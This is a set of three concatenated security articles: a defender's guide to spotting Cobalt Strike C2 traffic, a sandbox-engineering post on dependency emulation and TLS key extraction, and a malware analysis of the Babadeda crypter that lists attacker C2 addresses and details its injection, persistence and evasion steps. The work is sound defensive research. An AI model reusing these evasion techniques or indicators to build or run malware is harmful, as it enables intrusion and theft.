One interesting aspect that we have also mentioned in similar cases from our reporting is that the victim’s hostname is captured in this logon event as well as the source address being 127.0.0.1. Security Event ID 4624 Type 3 shows the attacker’s hostname Once again, the running Cobalt Strike beacon acts as the intermediary to facilitate the Remote Desktop session via reverse proxy. 
Inside Cobalt Strike’s
C2 Traffic This section will attempt to illustrate how the different malleable C2 profiles can affect network communication. 
In some of the examples below, we simulated the malicious C2 channel to show how different malleable profile configurations can change the observed traffic.
After that, we’ll examine network data associated with lateral movement and the various methods employed by Cobalt Strike operators based on our observations. 
HTTP/HTTPS C2 traffic 
We will use a slightly modified version of the jquery profile to illustrate how the configuration defines the various fields that make up the C2 connection.
Our previous article presented this jquery profile as one of the most commonly used profiles by threat actors in the intrusions we reported. 
As shown above, malleable C2 profiles can generate unique network traffic based on the provided configuration.
A portion of the malleable C2 profile configuration is shown at the bottom half of the screenshot.
At the top half of the screenshot, we show the HTTP communication between the Beacon and the Cobalt Strike server. 
The malleable profile determines the content of all parameters used in GET and POST requests.
Because of how simple it is to change these parameters, creating network signatures for proactive defense can be difficult.
Defenders can create signatures for publicly available profiles (see Sigma section below) or profiles extracted and made available thru open-source reporting.
One could search for traffic that matches known patterns (such as jquery or amazon) but the target IP/domain does not match the expected infrastructure. 
DNS C2 traffic Cobalt Strike is capable of using DNS as the C2 method.
Operators can choose to configure their server to respond to beacon requests in A, AAAA or TXT records.
This strategy is useful for more covert operations, as the destination host could be a benign DNS server.
Defenders will have to inspect the traffic data and look for suspicious DNS records. 
The screenshot below is from the official Cobalt Strike documentation page and shows how DNS communication works between the compromised host and the C2 server. 
In the below example, we emulated this technique and configured the Beacon to communicate over DNS and request new tasks using A records.
In the same way, we can configure the Beacon to use TXT or AAAA records for requesting tasks or sending information to the server.
It is worth noting that the default method is the DNS TXT record data channel.
Below is the infrastructure that we used for demonstration purposes: Target Host: 192.168.88.179 Internal DNS server: 192.168.88.2 Cobalt Strike C2 domain: infosecppl.store We instructed the Beacon to execute the command systeminfo on the compromised host.
As you can see from the screenshot below, it took 148 packets containing DNS requests and responses to finish the task and send back the data to the Cobalt Strike Server.
The activity took 5 seconds to complete. 
As with HTTP/HTTPS traffic, DNS traffic can be randomized using malleable C2 profiles.
Some of the options that are available to threat actors are as follows: 
The above table was taken from Cobalt Strike’s official documentation SMB Beacons Another option for threat actors is to employ SMB beacons, once they have gained access to the network.
SMB beacons open a local port on the target host and listen for incoming communication from a parent beacon.
The communication between the two beacons is possible thanks to named pipes. 
The operators can configure the pipename on the client; however, the default pipename starts with “msagent_#” for SMB beacons.
For a list of default pipe names for other services including some custom profiles check out @svch0st’s post here. 
SMB beacons are mostly used to make network detection harder and to get access to isolated systems where communication to the internet is prohibited.
Additionally, due to SMB protocol being accessible in most internal networks, it makes for a reliable C2 method.
Operators can also chain beacons and move laterally inside the network. 
According to our records, SMB beacons are not frequently used.
However, they’re still a powerful weapon in the hands of skilled operators.
As we do not see SMB beacons used often in our intrusion cases, we took an example case from our lab to demonstrate the effectiveness of this method. 
We ran a PowerShell loader on the target host, which loaded a stageless SMB beacon in memory.
In our case, the SMB Beacon is communicating over the network with a parent Beacon using named pipes.
For this example, we chose the named pipe “my_pipes”. 
As you can see from the screenshots below, windows event 4688 contains the execution of the PowerShell command. 
As explained in our previous Cobalt Strike article, Sysmon events 17 and 18 can log named pipes.
However, Sysmon should be explicitly configured to log named pipes.
A good public Sysmon config that includes named pipes and much more is Olaf‘s Sysmon Moduler. 
Below, you can see the named pipe created that we specified on the Cobalt Strike interface when we created the SMB listener. 
Furthermore, the SMB Beacon will communicate over port 445 to the main beacon as we described above, which will then send the results to the C2 server.
This is known as chaining beacons.
The below screenshot illustrates the SMB communication between the beacon on the beachhead host and the chained beacon(s).
Another way to describe the communication is a parent/child relationship. 
The network traffic shows the target host communicating over SMB with the other compromised host running the parent HTTP Beacon.
Named Pipes are used to facilitate the transition of data. 
192.168.38.102 = SMB Beacon 192.168.38.104 = HTTP Parent Beacon Detecting and Analyzing C2 Traffic Thanks to free, open-source tooling, investigating network traffic has become more accessible.
There are specific tools that we use to analyze suspicious network traffic in our intrusion cases.
We believe that no single tool can provide complete detection coverage, but we can get close by combining them.
In the following section, we will look at these tools that could accelerate analysis for defenders. 
Sigma We’ll go through a few Sigma rules that can help us detect Cobalt Strike’s network activity. 
Cobalt Strike DNS Beaconing is a rule created by Florian Roth which looks at DNS logs to detect the default DNS C2 behavior based on the dns_stager_subhost, put_output and dns_stager_subhost as seen above. 
Below is a more generic rule created by @bareiss_patrick which is a good example of detecting suspicious DNS traffic based on a high amount of queries for a single domain. 
Another more generic rule created by Daniil Yugoslavskiy uses dns logs to look for 50 or more TXT records from a single source in one minute: Default Cobalt Strike Certificate is a rule written by Bhabesh Raj that uses Zeek logs to detect the default Cobalt Strike certificate. 
RDP over Reverse SSH Tunnel WFP by Samir Bousseaden is a rule that can look for suspicious RDP activity using reverse tunneling. 
CobaltStrike Malleable Amazon Browsing Traffic Profile by Markus Neis which looks at proxy logs for the Amazon Malleable profile. 
Other malleable profile rules include CobaltStrike Malformed UAs in Malleable Profiles, CobaltStrike Malleable (OCSP) Profile, and CobaltStrike Malleable OneDrive Browsing Traffic Profile. 
All Sigma rules here are documented towards the bottom of Part 1. Rita Rita stands for Real Intelligence Threat Analytics (RITA), developed by Active Countermeasures.
Rita is a framework for detecting command and control communication.
It takes Zeek logs data and can, in our experience, accurately detect beaconing activity. 
One of the great features of Rita is its ease of use and detailed output information in various forms, including CSV and HTML.
One simply can point Rita to the Zeek logs and wait for the results.
The more available data, the more precise the results will be.
Zeek logs can be generated from the PCAP(s). 
The screenshot samples below show the results created by Rita based on the traffic we used in the previous sections to demonstrate the jquery malleable C2 profile. 
We left the Beacon running for an hour to simulate an actual infection while several other network-unrelated processes ran in the background.
During this hour, we tasked the Beacon with carrying out several commands.
Rita determined that one hour of network data was adequate for identifying the beacon link and assigning it the highest score.
Although, the more data you have, the more accurate the results will be. 
Below, we can see the results from one of our recent cases, BazarLoader and the Conti Leaks.
The first three IP addresses relate to the CS servers with which the Beacon communicated. 
Rita accurately identified beaconing activity related to Cobalt Strike C2 communication.
Using Rita, we can identify malicious C2 traffic based on multiple variables, including communication frequency, average bytes sent/received, number of connections etc.
As a result, we can detect Cobalt Strike beaconing regardless of the malleable C2 profile utilized or any additional jitter present. 
JA3/JA3S JA3 is an open-source project created by John Althouse, Jeff Atkinson and Josh Atkins.
JA3/JA3S can create SSL fingerprints for communication between clients and servers.
The unique signatures can represent several values collected from fields in the Client
Hello packet: - SSL Version - Accepted Ciphers - List of Extensions - Elliptic Curves - Elliptic Curve Formats For more information on how JA3 works, you can visit the official GitHub repository here: https://github.com/salesforce/ja3. 
The JA3 tool is used to generate a signature for the client-side beacon connection with the server.
JA3S, on the other hand, is able to generate a server fingerprint.
The combination of the two can produce the most accurate result.
JA3S can capture the full cryptographic communication and combine the JA3 findings to generate the signature. 
The downside of this method is that it can produce inaccurate results if the Cobalt Strike is behind redirectors. 
We can find many reports that contain the JA3 value that corresponds to the Cobalt Strike fingerprint.
When it comes to Cobalt Strike infrastructure, the known JA3 and JA3s signatures that we are looking for are: JA3 72a589da586844d7f0818ce684948eea a0e9f5d64349fb13191bc781f81f42e1 JA3s b742b407517bac9536a77a7b0fee28e9 ae4edc6faf64d08308082ad26be60767 By using JA3/S signatures, we can discover various malware C2 servers and not just Cobalt Strike.
Salesforce provides a thorough collection of signatures that belong to many different applications here.
Some other example signatures with well known JA3 fingerprints are: Trickbot: 6734f37431670b3ab4292b8f60f29984 AsyncRat: fc54e0d16d9764783542f0146a98b300 Dridex: 51c64c77e60f3980eea90869b68c58a8 JA3 of Python usually hosting Empire or PoshC2: db42e3017c8b6d160751ef3a04f695e7 TOR client: e7d705a3286e19ea42f587b344ee6865 Another very good website to test the JA3 signature against a large database is ja3er. 
JARM Similar to JA3/JA3S, JARM has the ability to fingerprint the TLS values of the remote server.
It does this by interacting with the target server sending 10 TLS Client
Hello packets and recording the specific attributes from the replies.
It will then hash the result values and create the final JARM fingerprint. 
Unlike JA3/S, JARM is an active way of fingerprinting remote server applications.
John Althouse has created a medium post that accurately conveys the differences between JA3/S and JARM: “JARM actively scans the server and builds a fingerprint of the server application.
Whereas JA3/S is passive, just listening, not reaching out, JARM is active, actively probing the target.
And is able to build a fingerprint of the server application where JA3S could not.” 
According to research and further changes on the JAVA TLS version as mentioned below, the JARM fingerprint that corresponds to a default configuration of the Cobalt Strike is: 07d14d16d21d21d00042d41d00041de5fb3038104f457d92ba02e9311512c2 Cobalt Strike is dependent on Java to run both the client graphical user interface (GUI) and the team server.
When we scan a Cobalt Strike server using JARM, the results we get back are dependent on the Java version that is used.
According to Cobalt Strike’s documentation, OpenJDK 11 is the preferred version that needs to be installed by the operators.
This makes it easier to identify a potential Cobalt Strike server, however, defenders should be aware that this outcome alone is prone to false positives.
This is because many other legitimate servers on the internet use this version of Java to operate their web applications. 
On April 20th, 2021 Java Disabled TLS 1.0 and TLS 1.1 in favor of TLS 1.2 or above.
Following this change, the JARM fingerprint for Cobalt Strike servers changed: From: 07d14d16d21d21d07c42d41d00041d24a458a375eef0c576d23a7bab9a9fb1 
To: 07d14d16d21d21d00042d41d00041de5fb3038104f457d92ba02e9311512c2 This change was highlighted by @bodziurity and @WLesicki in a collaborative effort: Cobalt Strike has a post dedicated to JARM that goes into detail on how JARM works and how the specific hash value is created based on the Java version. 
Looking into our reporting for this hash value will return four of our cases.
All these cases involve Cobalt Strike as the post-exploitation method. 
To generate a JARM fingerprint against a server, you can run the JARM python tool: python3 jarm.py
[target] -p
[port] While JARM’s offer another tool to help reveal adversary infrastructure they are not an indicator that can be used in isolation.
JARM signatures can be masked, Dagmawi Mulugeta presented at HiTB Amsterdam in 2021 a tool that enables red teams or adversaries to mask the JARM signatures of their infrastructure.
Called JARM Randomizer the tool can be configured as a proxy in front of the Cobalt Strike server to serve up false data to potential internet scanners. 
Other JARMs can be found at: https://github.com/cedowens/C2-JARM. 
Arkime (Moloch) and JA3/S We included Arkime as it integrates with JA3/JA3S and other plugins to enhance network analysis.
Arkime is a tool that we use a lot to investigate network activity and gather indicators.
It can index network traffic and make events easily searchable. 
Arkime is simple to set up and excellent for reviewing traffic.
Arkime makes use of additional analysis tools by including them as plugins.
More on this and other tools in the next report. 
All for now That wraps up Cobalt Strike, a Defender’s Guide Part 2.
Would you like to see something specific in Part 3?
Contact us here or on Twitter with suggestions.
Thanks for reading and hope this helps! 
Please see the bottom of our first report for more detections & rules. 
The post Cobalt Strike, a Defender’s Guide – Part 2 appeared first on The DFIR Report. 
title: Tailoring Sandbox Techniques to Hidden Threats url: https://unit42.paloaltonetworks.com/tailoring-sandbox-techniques/ Executive Summary Malware authors often throw curve balls that are meant to confound automated detection systems.
We’ve adapted to these techniques by tailoring our analysis platform in a couple of notable ways that we’ll discuss, particularly to address malware that engages in sandbox evasion. 
The first is an approach we call “dependency emulation,” where we can successfully detonate malware samples that would not normally be able to execute in our sandbox environment due to a lack of dependencies.
We will also discuss our strategies of stealthy instrumentation for analysis of encrypted network traffic, to combat the ways SSL can be used to complicate command-and-control (C2) traffic analysis. 
One overarching goal malware authors share is to remain undetected until their overall objective is reached.
As we’ve previously detailed in this blog post series, this has resulted in a seemingly limitless number of evasions and strategies targeted at confounding sandboxing and static analysis approaches.
Due to the endless cat-and-mouse nature of reacting to malware authors’ efforts to remain undetected, we’ve come to understand that the most important characteristic for any automated malware analysis platform is adaptability. 
Palo Alto Networks customers receive improved detection for the evasions discussed in this blog through Advanced WildFire. 
Table of Contents Dependency EmulationExample File InfectorMitigating the Dependency ProblemVMI SSL/TLS DecryptionTLS HandshakesExample SSL Decryption With WiresharkConclusionIndicators of Compromise Dependency Emulation In the context of malware execution, we talk a lot about dependencies.
When we do, we’re referring to additional code that an executable depends on that is not inside the executable file.
On Windows, external dependencies are usually Dynamically Linked Libraries (DLLs) that contain additional functionality that can be imported into the process to execute. 
Often malware does not require external libraries in order to execute its malicious code, or it might call functions from those external libraries in a very late stage of its execution.
Over the past few years we’ve noticed a large uptick in malicious Windows executables that require external libraries for things like graphical user interfaces or better cross-platform support, and if the libraries are missing, then the malicious sample won’t be able to run.
When Windows cannot load an application because of a missing library, it will show a “System Error” error message box that displays the missing library name. 
When we run any executable in our sandbox environment that requires dependencies that are not present, we would see the same error.
But we wouldn’t be able to get any analysis information from the sample because no malicious code was executed. 
In Figure 1, we can see a screenshot of the ATMSpitter malware family, which requires the DLL MSXFS.dll to fully detonate.
Without the required DLL, we would just see an error dialog telling us that Windows can’t run this file.
If we place the correct file inside the same directory and run the sample again, it runs just fine
and we can extract information such as executed system calls and modified memory regions. 
Figure 1.
ATMSpitter malware requires MSXFS.dll to run.
File infectors like Sality, Floxif, Expiro and Ramnit typically infect predefined sets of executables that they find on the disk.
If the infected file requires specific libraries that are not part of the operating system (OS), then chances are it’s not going to detonate inside a malware analysis sandbox because these dependencies likely won’t be preinstalled in the environment.
Our sandbox environments are constrained in resources like disk space, and the number of DLL files in the world is seemingly infinite. 
Normally, when we run into this situation and the OS loader refuses to execute our file, we are left with no data at all from dynamic analysis.
What is even more frustrating about this situation is that in many cases, those dependencies don’t matter for infected files in that they aren’t even going to be used. 
File infectors usually call their malicious code very early (e.g., by replacing an early call instruction to their malicious code, or by overwriting the entry point in the PE header) before any function calls from external libraries are ever called.
The OS will refuse to load and execute our file, despite the fact that none of the dependencies mattered anyway. 
Example File Infector Let’s take a look at one file that has been infected by the Sality malware, which requires external dependencies to run inside a sandbox.
The original file is Groove Audit Service from Microsoft Office, and it requires dependencies from the libraries GrooveNew.dll and GroveUtil.dll (shown in Figure 2).
If those two libraries are missing on the system, then the sample won’t be able to run. 
Figure 2.
The required dependencies.
If we compare the original file to the infected file inside a PE viewer like StudPE (shown in Figure 3), we notice that the infector has modified only a few values in the PE headers including the size of the image, checksum and section flags to make the last section executable. 
Figure 3.
Sality infected executable compared to the original file.
But if we open both the executables inside IDA Pro, we immediately see that the code at the entry point is totally different compared to the original (shown in Figures 4 and 5, below).
The malicious code in the infected file is being called right at the entry point and doesn’t require any dependencies to fully infect the system.
However, because of the required dependencies, regular malware analysis sandboxes won’t be able to run this kind of file. 
Figure 4.
Original entry point.
Figure 5.
Modified entry point.
Mitigating the Dependency Problem What can we do about this dependency problem for analysis at scale?
Dependency emulation is an approach we’ve recently prototyped and found useful to address this. 
The main idea of this approach is to detect this situation automatically, and to adapt our sandbox environment to the files being detonated to ensure executables will have a chance to detonate.
Since we have full control over the sandbox, it’s easy to determine that the executable under analysis requires an external library, and to lie to the executable that all of its dependency requirements are met. 
Given the million or so unique Windows executables we process daily, it would be an extremely difficult (if not impossible) task to automatically detect and add the specific external libraries for each executable that required external dependencies.
There are literally hundreds of millions of libraries out there with numerous versions for each, and it’s not really feasible to support providing any arbitrary library in a way that guarantees the intended execution of every sample. 
However, as we’ve discussed in our initial post in this blog series, we often don't need full execution for accurate detection.
If we can get the malware sample under analysis to get past the Windows loader, initialize itself and unpack any additional payloads, we have a much better shot at detection.
Otherwise, we simply get an error from the Windows loader (as shown in Figure 1) and no additional information beyond what static analysis would buy us. 
But what happens when the executable tries to call a function in one of those dependencies?
The bad news is that, since we aren’t trying to provide actual copies of the required libraries, we can’t correctly simulate the function calls into any of the libraries not present in our environment. 
The good news is that, in most cases, this is still enough for accurate detection.
We don’t need to correctly execute every code path present in the executable, we just need enough execution and memory artifacts for accurate detection.
For this reason, in order to avoid unintentional crashes or bugs from the analyzed sample, our sandbox stops the execution if any function from the generated stub libraries is called. 
All things considered, with this approach we've seen a lot of samples detonate that wouldn't otherwise, and we've seen many correct detections. 
VMI SSL/TLS Decryption Another challenge we’ve faced with analyzing malware at scale is how to stealthily spy on TLS encrypted traffic in a way that’s not detectable by the malware.
As HTTPS and other protocols built on SSL have become increasingly ubiquitous for accessing resources across the internet, it’s not surprising that malware authors also use this protocol for other things, such as pulling down the next stage of their payload, or C2 communications. 
It is possible, of course, to take the easy route and intercept and decrypt all of the traffic from our sandbox with a meddler-in-the-middle approach.
The problem with this is that it’s detectable by examining and validating TLS certificates.
It’s also possible to instrument and log calls to some of the higher level networking APIs, but again, this is also detectable in many cases and isn’t going to get us all encrypted communications. 
One solution we’ve found useful for this problem is to detect when TLS connections are being initiated and log the symmetric keys generated for the SSL/TLS connection using virtual machine introspection (VMI). 
Before we look into that detection method, let’s have a quick lesson on TLS handshakes. 
TLS Handshakes When an SSL/TLS connection is being established, certain data between the local system and the remote server is exchanged to validate each side's authenticity and generate symmetric keys to encrypt data over the wire. 
This data includes the following: Preferred TLS version Supported cipher suites 32 bytes of random data used in the key generation algorithm A data signature, in the case of an ephemeral elliptic-curve Diffie-Hellman (ECDHE) key exchange An example of an ECDHE “Server Hello” message is shown in Figure 6. Figure 6.
Wireshark screenshot illustrating the initial handshake for an SSL connection.
In the case of a Diffie-Hellman (DH) handshake, additional DH parameters are then exchanged, and each side separately calculates a pre-master secret.
Finally, the same master secret key is calculated on each side by utilizing the pre-master secret and the client and server random values. 
The calculated master secret is 48 bytes in length.
Through reverse engineering efforts, we discovered that this key generation occurs in the ncrypt.dll library in recent versions of the Windows OS. 
The key generation happens in memory, so the key is never written to disk and it doesn’t traverse the wire.
By knowing the exact location in code where each master key is generated and precisely where it resides in memory, it is possible to extract the key.
This can be accomplished with, for example, an analysis engine via virtual machine introspection, which makes a system invisible to the malware.
A similar approach can be implemented in instances where other third party libraries are used for key generation, such as OpenSSL. 
An example output, which includes everything needed to decrypt TLS traffic, is shown in Figure 7. 
Figure 7.
Extracted random value and master key.
Final keys and initialization vectors used to encrypt and decrypt network traffic are generated from the master secret through a key expansion.
Conveniently, the open source tool Wireshark/Tshark accepts a keyfile to perform this decryption automatically on collected pcap traffic. 
Example SSL Decryption With Wireshark Let's take a look at a real world example of a sample that belongs to the malware family FormBook.
The sample is loaded by a loader written in Delphi, which downloads the next stage from a public file storage service using HTTPS. 
If we open the recorded package capture in Wireshark and provide the extracted SSL/TLS keys that were extracted by the analysis platform, we should be able to see the SSL encrypted traffic to the public file storage service, including the downloaded data. 
The random client value and the master secret key must be stored in a specific file format that Wireshark supports.
It looks like this: CLIENT_RANDOM
<random_client_value> <master_secret_key> To provide the decryption keys to Wireshark, we have to use the option ssl.keylog_file, which we can pass through the command line.
For example: Wireshark -r guest_traffic.pcap -o "ssl.keylog_file:key_capture.keys" After opening the capture (pcap) in Wireshark, the TLS encrypted data will be decrypted, and we can use the http filter to get the decrypted HTTPS traffic.
This is shown in Figure 8. Figure 8.
Decrypted HTTPS traffic.
In Figures 9 and 10, we can see the communication to the public file storage service. 
Figure 9.
Communication to the public file storage service.
Figure 10.
Downloaded data from public file storage.
With the decrypted content, we can write more precise behaviors and signatures that match a malicious sample's network communication. 
Conclusion In this post we have discussed two important ways we’ve been able to tailor our analysis environment.
As we’ve mentioned in previous posts, adaptability in sandboxing is exceptionally important when it comes to staying on top of the malware detection problem.
Threats are continually evolving, and architecting analysis systems as more of a flexible, nicely abstracted software development kit instead of a stand-alone monolithic application is crucial. 
With this in mind, we’ve gone over two important ways our platform adaptability has paid off in Advanced WildFire.
With Dependency Emulation, we can increase our detonation rates to collect more execution logs necessary for accurate detection.
With VMI SSL/TLS Decryption, we have visibility into all SSL/TLS communications in a way that isn’t detectable by malware authors. 
Once again, if you’ve made it this far, thank you again for reading and we hope you enjoyed this peek into some of the more interesting work we’ve been doing as part of our never-ending endeavor to accurately detect every last malicious file the global internet has to offer us. 
Indicators of Compromise SHA-256 Name c5b43b02a62d424a4e8a63b23bef8b022c08a889a15a6ad7f5bf1fd4fe73291f ATMSpitter a3b2de8f0d648f3e157300d0a88971919eb273b7d1c7b9ed023f26b5cc0ac3ca Sality infected file 4e32a6000a2b33ed0b8e4cf1256876c356cf5508ce0df2752fcfa214b6c2795b Formbook (SSL Decryption) 
Get updates from Palo Alto Networks! Sign up to receive the latest news, cyber threat intelligence and research from us 
title: Babadeda Crypter targeting crypto, NFT, and DeFi communities url: https://blog.morphisec.com/the-babadeda-crypter-targeting-crypto-nft-defi-communities The cryptocurrency market is now worth more than $2.5 trillion.
Unfortunately, this fact is not lost on threat actors.
As well as using cryptocurrency themselves to extract ransoms, cybercriminals are now also tailoring malware to exploit the booming market for NFTs and crypto games.
In a discovery of critical importance to anyone familiar with this space, Morphisec Labs has encountered a new campaign of malware targeting cryptocurrency enthusiasts through Discord. 
Crucially, the crypter that this campaign deploys, which we have termed Babadeda (a Russian language placeholder used by the crypter itself which translates to “Grandma-Grandpa”), is able to bypass signature-based antivirus solutions.
Although some variants of this crypter have been noted by other vendors, Morphisec is the first to fully disclose how it works. 
For victims, this makes infections highly likely — and dangerous.
We know that this malware installer has been used in a variety of recent campaigns to deliver information stealers, RATs, and even LockBit ransomware.
Fortunately, however, even as the threat level for cryptocurrency users rises, we also know that Morphisec’s Moving Target Defense technology is capable of both seeing and stopping Babadeda. 
In this blog post, we will explore how Babadeda is being delivered, what an in-depth technical analysis of this malware tells us about it, and how it can be stopped. 
Crypto and NFT Communities Are Prime Targets Since May 2021, we have observed several malware distribution campaigns. 
However, many of the recent infections we have seen appear to be related to a sophisticated campaign that exclusively targets the Crypto, NFT, and DeFi communities.
It is precisely for this reason, as well as the fact that NFTs are rising in popularity, that we have decided to take a look at this particular campaign distribution in more detail. 
For those who are not familiar with NFTs (Non-fungible token): the term refers to unique tokens that provide proof of ownership on data that is stored on the blockchain technology.
In recent years, NFTs have exploded in popularity, and are now starting to enter the mainstream consciousness.
Naturally, this growing trend in the crypto space has opened up a new vector for threat actors to exploit. 
The DElivery Chain The vast majority of today's NFT and crypto communities are based on Discord (a group chatting platform) channels.
Discord channels are publicly accessible and allow users to send private messages to one another within a channel. 
In the campaign that we observed, a threat actor took advantage of these features in order to phish victims.
The threat actor sent users a private message inviting them to download a related application that would supposedly grant the user access to new features and/or additional benefits.
Because the actor created a Discord bot account on the official company discord channel, they were able to successfully impersonate the channel’s official account. 
Below is an example of a phishing message that targeted users of “Mines of Dalarna”, a PC game built on the blockchain. 
Figure 1: Fake message on the discord channel. 
If a user clicks on the URL within the message, it will direct them to a decoy site.
There, the user will be encouraged to download a malicious installer that embeds the Crypter with the payload. 
Figure 2: Original and decoy sites comparison As you can see from the example above, the threat actor took extended measures to ensure that the delivery chain looks legitimate even to technical users.
Typically: Cybersquatting - the domain names of the decoy sites look a lot like the domain names of the original sites Threat actors will usually remove/add a letter from/to the domain name or change the top-level domain. 
The domains are signed with a certificate (via LetsEncrypt), which enables an HTTPS connection. 
The UI of the decoy pages is very similar to the UI of the original pages. 
Upon clicking “Download APP”, the site will generally navigate to /downland.php, which will redirect the download request to a different domain (this makes it less likely that someone will detect a decoy site). 
Interestingly, on one of these decoy sites, we noticed an HTML object written in Russian.
This suggests that the threat actor's origins may be in a Russian-speaking country since they most likely forgot to translate the HTML object from their native language into English Figure 3: Lost in translation? 
Decoy site examples The following table shows a few examples of the decoy sites used in the campaigns we have observed. 
Original Domain Decoy Domain Description IP Resolved Installer Name opensea.io openseea[.]netopenseaio[.]net The most popular NFT marketplace 185.117.2[.]82 OpenSea-App_v2.1-setup.exe larvalabs.com larvaslab[.]comlarva-labs[.]net The creators of CryptoPunks - The most popular PFP NFTs 185.117.2[.]81185.117.2[.]8245.142.182[.]160 LarvaLabs-App_v2.1.1-setup.exe boredapeyachtclub.com boredpeyachtclub[.]com BAYC - one of the most popular PFP NFTs 185.117.2[.]4 185.212.130[.]64 BAYC-App-v2.1-release.exe We have identified at least 82 domains created between July 24, 2021, and November 17, 2021, with the following registration time distribution (credit to @msuiche). 
The Payloads The following table tracks the RATs used by this specific campaign’s threat actor
: Dates Observed RAT C2 11 Nov 2021 - 22 Nov 2021 Remcos 65.21.127.164[:]4449 14 Oct 2021 - 22 Oct 2021 BitRAT 135.181.6.215[:]7777 09 Sep 2021 - 14 Oct 2021 BitRAT 135.181.140.153[:]7777 24 Aug 2021 - 07 Sep 2021 BitRAT 135.181.140.182[:]7777 Technical Analysis of the Babadeda Crypter Figure 4: Execution flow diagram During our research, we found different variants of the same Crypter — all of which contain the same main execution flow (denoted by the figure above).
While investigating the Crypter, we saw how important it was for the threat actor to hide its malicious intentions inside legitimate applications in order to avoid detection.
The following figure emphasizes the complexity of the evasive techniques that are implemented in the Crypter. Figure 5: Low detection rate on VT The Installer Once downloaded and executed, the malicious installer copies its compressed files into a newly created folder with a legitimate-looking name (i.e., IIS Application Health Monitor) in one of the following directory paths: C:\Users\<user>\AppData\Roaming\C:\Users\<user>\AppData\Local\ The malicious files are copied along with many other open-source or free application-related files.
At first glance, the files within the directory may seem legitimate.
However, looking at these files carefully it becomes apparent that some of them are suspicious and should be inspected, as shown by the figure below. 
Figure 6: The compressed files (malware files selected with stage numbers) Crypter Execution After dropping the mentioned files, the Installer starts execution via the main executable (number 1 in the figure above). 
We have noticed that at this point, some variants display a fake error message that stops the execution until the user interacts with the message.
This fake message might be used as a security solutions evasion technique.
Alternatively, its role may be to deceive the user into thinking that the application has failed to execute, even as it silently continues the malicious execution in the background. 
Figure 7: Fake error message By analyzing the two different variants, we can see the implementation of this message box: Figure 8: Comparison between variants As we can see in the figure below, the function’s code is much longer compared to the actual DLL loading code.
That’s because the actor has implanted its actions within a legitimate application code in order to confuse analysts, obfuscate its real intentions, and make it harder for antivirus solutions to detect. 
Figure 9: Left - the full function.
Right - the DLL loading code The Shellcode's Loader DLL 
The threat actor generally embeds the next stages of the execution inside an additional file, usually an XML or a PDF file.
Nonetheless, we have also observed additional file types such as JavaScript, Text, and PNG. 
Here, just like before, the actor embeds the malicious code inside different legitimate codes.
We have extracted the relevant sections to clearly demonstrate the malware’s activity: Figure 10: Exported function logic The malicious logic starts by reading the additional file (in this case an XML file) and calling kernel32!Sleep for 35 seconds (the duration changes between variants).
Next, it loads this entire file to memory and starts its parsing task. 
The first piece that is parsed from the file is a shellcode located in a pre-calculated offset (in this case, 0x88D8C and overwrites the executable at offset 0x1600). 
Figure 11: The shellcode bytes inside the XML file The executable .text section’s characteristics are configured to RWE (Read-Write-Execute) -- that way the actor doesn't need to use VirtualAlloc or VirtualProtect in order to copy the shellcode and transfer the execution.
This helps with evasion since those functions are highly monitored by security solutions.
Once the shellcode is copied to the executable, the DLL calls to the shellcode’s entry point (shellcode_address). 
Persistency Implementation If the crypter is configured to install persistence, the loader DLL will execute a new thread that loads another DLL (from the compressed files) that will handle this task. Figure 12: New thread creation for calling the persistent mechanism The newly loaded DLL will either use one of the following logics or both of them to implement the persistency: Write a.lnk file in the startup folder that executes the Crypter’s main executable. 
Figure 13: .lnk file persistence implementation Write a registry Run key that executes the Crypter’s main executable. 
Figure 14: registry run key persistence implementation The Decryption Shellcode The XML file (or any other file type used by the crypter) contains the following components: The first shellcode (referred to in this section). 
An encrypted additional shellcode (referred to in the next section, the Loader shellcode) An encrypted payload. 
The Decryption shellcode has three main tasks: first, it extracts the Loader shellcode and the payload, then it decrypts them, and finally, it transfers the execution to the decrypted Loader shellcode. 
Figure 15: Decryption shellcode execution flow The Decryption shellcode begins with dynamically locating the configuration structure by searching for a sequence of six or more identical bytes.
This configuration holds pointers to the loader shellcode and the final payload; these are encrypted and split inside the XML. Figure 16: Configuration and XML file’s structures Based on this, we can identify the configuration inside the XML file: Figure 17: Configuration structure Using this configuration the malware iterates over each chunk copies it, and decrypts it using the denoted decryption key (the configuration changes between samples). 
Then, the shellcode searches for two DWORD placeholders, 0xBABADEDA and 0xDEADBEAF.
It replaces the first placeholder with the address of the decrypted payload and the latter with the size of the payload.
This data is used in the next stage, the Loader shellcode. 
The Loader Shellcode The purpose of the Loader shellcode is to inject the decrypted payload within the currently running process (itself). 
We can divide the loading mechanism into three stages: initialization, injection, and correction. 
Initialization This stage is responsible for setting the relevant data that will be used during the injection and correction stages. 
Figure 18: Extracting the data for injection and correction stages To start initializing, the Loader first saves the decrypted payload address and payload size according to the placeholder’s addresses.
Next, it parses the PE headers of the payload to extract the image size and the entry point according to the current executable’s base address.
The Loader parses the _PEB structure in order to find the base address of the current executable and the LDR_DATA_TABLE_ENTRY which will be used later.
Finally, it dynamically loads the VirtualProtect function using a pre-calculated hash value (0xF1C25B45 in our case). 
Injection This stage is pretty straightforward.
Within it, the Loader overwrites the current PE with the final payload’s PE.
It does so by copying the PE headers and each section according to the current executable’s base address. 
Figure 19: Change headers protection and clear memory bytes for the new PE Once previous bytes have been cleared, the Loader copies the new PE headers to the base address and each section to the relevant location according to the IMAGE_SECTION_HEADER. 
Correction The final stage is responsible for fixing the import address table and relocation table of the newly injected PE. 
Figure 20: Fix tables and remove altering evidence mw_construct_IAT Load GetModuleHandleA, LoadLibraryA and GetProcAddress functions by hash (0x9FE4FCE1, 0x85557334 and 0xF23B576D respectively). 
Iterate over the IAT of the new PE. 
Load each function and update its address. 
mw_construct_RELOC Calculate the delta between the previous image base and the current one. 
Iterate over each entry in the relocation table. 
Add the delta to the entry value. 
In addition to fixing the import address and relocation tables, the Loader removes evidence of injection by using the following methods: Update the LDR data table entry to match the injected PE. 
Remove the injected PE headers from memory. 
These steps attempt to evade memory scanners that seek mismatching LDR data and in-memory PEs. 
Finally, the malware jumps to the entry point of the newly injected PE with the original command-line arguments. 
Conclusion As demonstrated above, Babadeda is a highly dangerous crypter.
Targeting cryptocurrency users through trusted attack vectors gives its distributors a fast-growing selection of potential victims.
Once on a victim's machine, masquerading as a known application with a complex obfuscation also means that anyone relying on signature-based malware effectively has no way of knowing Babadeda is on their machine — or of stopping it from executing. 
Mitigating the threat posed by Babadeda requires securing the device memory it targets.
Morphisec does this through Moving Target Defence, a technology that morphs process memory trapping crypters like Babadeda before they are able to deploy. 
